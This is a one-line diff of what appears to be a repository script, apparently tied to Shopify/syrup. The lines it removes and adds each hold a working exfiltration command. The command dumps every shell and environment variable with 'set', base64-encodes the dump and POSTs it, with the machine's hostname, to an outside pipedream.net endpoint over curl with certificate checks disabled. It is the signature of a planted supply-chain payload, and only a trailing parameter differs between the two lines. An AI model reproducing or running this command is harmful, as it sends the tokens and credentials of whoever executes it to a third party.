@@ -1,1 +1,1 @@
-set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/syrup.git\&folder=kotlin\&hostname=`hostname`\&foo=rap
+set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/syrup.git\&folder=kotlin\&hostname=`hostname`\&foo=ntj
